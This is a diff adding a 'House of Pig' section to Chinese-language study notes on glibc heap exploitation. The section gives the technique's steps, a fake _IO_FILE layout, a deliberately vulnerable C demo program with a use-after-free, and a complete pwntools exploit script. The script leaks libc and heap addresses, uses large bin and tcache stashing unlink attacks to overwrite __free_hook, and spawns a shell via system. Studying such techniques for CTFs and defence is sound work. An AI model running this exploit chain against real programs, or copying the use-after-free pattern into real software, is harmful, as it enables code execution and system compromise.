@@ -35,6 +35,7 @@
     - [House of Orange](#house-of-orange)
     - [House of rabbit](#house-of-rabbit)
     - [House of Roman](#house-of-roman)
+    - [House of Pig](#house-of-pig)
   - [other](#other)
     - [通过 `main_arena`地址获取 `glibc`基地址的偏移](#通过-main_arena地址获取-glibc基地址的偏移)
     - [\_\_malloc\_hook和\_\_free\_hook](#__malloc_hook和__free_hook)
@@ -1033,8 +1034,9 @@ __攻击:__
 
 __注意:__
 
-- 在伪造时，需要让 `fake chunk` 的 `bk`指向一个可写内存，准确来说，是 `bk->fd`可写
+- 在伪造时，需要让 `fake chunk` 的 `bk`指向一个可写内存，准确来说，是 `bk->fd`可写，这里将会被写入libc中的地址
 - 由于在`small bin`取出`chunk`时会检查`bck->fd == victim`, 所以需要保证`small bin`中第二个`chunk`的`fd`指向将要取出的`chunk`
+- 伪造时，如果没有`malloc`，需要通过切割`unsorted bin`来获取对应大小`small bin`的`chunk`，注意，切割出来的`chunk`大小应当大于放入`chunk`的大小，否则会从`small bin`中切
 
 __示例:__
 
@@ -1376,6 +1378,243 @@ __攻击:__
 __注意:__
 
 高版本`glibc`有`tcache bin`，并且对 `fast bin` 的 `fd` 进行了加密
+
+### House of Pig
+
+__危害:__
+
+获取sh
+
+__原理:__
+
+程序中没有`malloc`
+
+利用`_IO_str_overflow`函数中的`malloc`, `memcpy`, `free`链, 分配出`__free_hook`, 设置`__free_hook`的值, 再调用`__free_hook`
+
+__条件:__
+
+存在UAF可以进行`large bin attack`和`tcache stashing unlink attack`
+
+__攻击:__
+
+- 泄露出libc地址和堆地址
+- 利用`large bin attack`设置`__free_hook-0x10`指向一个堆地址(刚开始设置的`__free_hook-0x8`但是不知道为什么出现错误)
+- 利用`large bin attack`设置`__IO_list_all`指向一个堆地址，在这个堆地址中布置`fake_IO_FILE_plus`
+- 利用`tcache stashing unlink attack`分配出`__free_hook`到`tcache bin`中
+- 退出即可劫持执行流
+
+fake_IO_FILE_plus的布置如下:
+
+```python
+# param_addr = heap_base + 0x128c0 + 0x60
+# fake_IO_FILE = b''
+# fake_IO_FILE = set_value(fake_IO_FILE, 0x40, param_addr + 78) # _IO_buf_end
+# fake_IO_FILE = set_value(fake_IO_FILE, 0x38, param_addr)      # _IO_buf_base
+# fake_IO_FILE = set_value(fake_IO_FILE, 0x28, 0x1000)          # _IO_write_ptr
+# fake_IO_FILE = set_value(fake_IO_FILE, 0x20, 0)               # _IO_write_base
+# fake_IO_FILE = set_value(fake_IO_FILE, 0x60, BINSH)
+# fake_IO_FILE = set_value(fake_IO_FILE, 0x78, system)
+# fake_IO_FILE = set_value(fake_IO_FILE, 0xD8, str_jumps)       # vtable
+```
+
+__示例:__
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <demo.h>
+char *ptr[0x100];
+int ptr_size[0x100];
+
+void add()
+{
+    int size;
+    int index;
+
+    scanf("%d", &index);
+    scanf("%d", &size);
+
+    ptr[index] = (char *)calloc(1, size);
+    ptr_size[index] = size;
+}
+void edit()
+{
+    int index;
+    scanf("%d", &index);
+
+    read(0, ptr[index], ptr_size[index]);
+}
+void show()
+{
+    int index;
+    scanf("%d", &index);
+    printf("%s\n", ptr[index]);
+}
+void delete()
+{
+    int index;
+    scanf("%d", &index);
+    free(ptr[index]);
+}
+
+int main()
+{
+    dm_InitStd();
+
+    while (1)
+    {
+        int ch;
+        printf(">> ");
+        scanf("%d", &ch);
+        switch (ch)
+        {
+        case 1:
+            add();
+            break;
+        case 2:
+            show();
+            break;
+        case 3:
+            edit();
+            break;
+        case 4:
+            delete();
+            break;
+        default:
+            exit(0);
+            break;
+        }
+    }
+
+    return 0;
+}
+```
+
+```python
+from demo import *
+context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '90'])
+p = process('./demo')
+libc = ELF('./libc-2.31.so')
+
+def add(index, size):
+    p.recvuntil('>> ')
+    p.sendline('1')
+    p.sendline(str(index))
+    p.sendline(str(size))
+def show(index):
+    p.recvuntil('>> ')
+    p.sendline('2')
+    p.sendline(str(index))
+def edit(index, content):
+    p.recvuntil('>> ')
+    p.sendline('3')
+    p.sendline(str(index))
+    p.send(content)
+def delete(index):
+    p.recvuntil('>> ')
+    p.sendline('4')
+    p.sendline(str(index))
+def exit():
+    p.recvuntil('>> ')
+    p.sendline('5')
+
+
+# 泄露libc和heap地址
+
+# 填充tcache bin
+for i in range(7):
+    add(i, 0x80)
+add(7, 0x80)    # 放入unsorted bin
+add(8, 0x10)
+add(9, 0x80)    # 放入unsorted bin
+add(10, 0x10)
+# 释放tcache bin
+for i in range(7):
+    delete(i)
+delete(7)
+delete(9)
+# 泄露地址
+show(7)
+libc_base = getaddr_byte6(p) - 0x1ecbe0
+msg("libc_base", libc_base)
+show(9)
+heap_base = getaddr_byte6(p) - 0x680
+msg("heap_base", heap_base)
+# 地址计算
+libc.address    = libc_base
+free_hook       = libc.sym['__free_hook']
+IO_list_all     = libc.sym['_IO_list_all']      #p &_IO_list_all
+str_jumps       = libc_base + 0x1E9560          # IDA中找
+system          = libc.sym['system']
+# 清空unsorted bin防止影响后面的利用
+add(11, 0x80)
+add(12, 0x80)
+
+# 将free_hook分配到tcache bin中
+
+# 使用large bin将一个堆地址写到 __free_hook - 0x10 的位置
+# 使用large bin将一个堆地址写到 IO_list_all 的位置
+add(13, 0x8020)
+add(14, 0x10)
+add(15, 0x8010)
+add(44, 0x10)
+add(39, 0x2020)
+add(40, 0x10)
+add(41, 0x2010)
+delete(13)
+add(16, 0x9000)
+edit(13, p64(0) + p64(0) + p64(0) + p64(free_hook - 0x10 - 0x20))
+delete(15)
+add(17, 0x9000)
+delete(39)
+add(42, 0x3000)
+edit(39, p64(0) + p64(0) + p64(0) + p64(IO_list_all - 0x20))
+delete(41)
+add(43, 0x3000)
+
+# 设置fake_IO_FILE_plus
+edit(41, HOP(heap_base + 0x128c0, str_jumps, 0x100, system)[0x10:])
+
+# 使用tcache stashing unlink attack分配出__free_hook
+# 使用0x100大小的chunk
+for i in range(5):
+    add(18 + i, 0x100)
+for i in range(7):
+    add(23 + i, 0x100 + 0x120)
+add(30, 0x100 + 0x120)
+add(31, 0x10)
+add(32, 0x100 + 0x120)
+add(33, 0x10)
+# 填充tcache bin
+for i in range(5):
+    delete(18 + i)
+for i in range(7):
+    delete(23 + i)
+delete(30)
+add(34, 0x110)
+add(35, 0x200)
+delete(32)
+add(36, 0x110)
+add(37, 0x200)
+
+# 指向伪造的fake_chunk (0x2348)
+edit(32, b'\x00' * 0x110 + p64(0) + p64(0x111) + p64(heap_base + 0xfe10) + p64(free_hook - 0x18 - 0x10))
+
+# 触发tcache stashing unlink attack漏洞
+add(45, 0x2a0 - 0x10)
+# 清空unsorted bin，防止影响_IO_str_overflow中的malloc利用
+add(38, 0x100)
+
+# gdb.attach(p, 'b _IO_str_overflow')
+# 触发漏洞
+exit()
+
+
+p.interactive()
+
+```
+
+__注意:__
 
 ## other
 
